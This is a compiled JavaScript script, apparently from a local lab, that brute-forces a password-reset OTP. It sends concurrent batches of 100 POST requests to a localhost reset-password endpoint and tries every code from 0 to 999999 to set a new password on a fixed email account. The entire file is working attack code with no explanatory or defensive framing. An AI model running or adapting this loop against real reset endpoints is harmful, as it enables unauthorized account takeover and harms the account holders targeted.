"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const main = (otp) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        yield axios_1.default.post("http://localhost:3000/reset-password", {
            otp: otp,
            email: "email@email.com",
            newPassword: "Password",
        });
    }
    catch (error) { }
});
const sendReq = () => __awaiter(void 0, void 0, void 0, function* () {
    for (let i = 0; i <= 999999; i += 100) {
        console.log(i);
        const p = [];
        for (let j = 0; j < 100; j++) {
            p.push(main((i + j).toString()));
        }
        yield Promise.all(p);
    }
});
sendReq();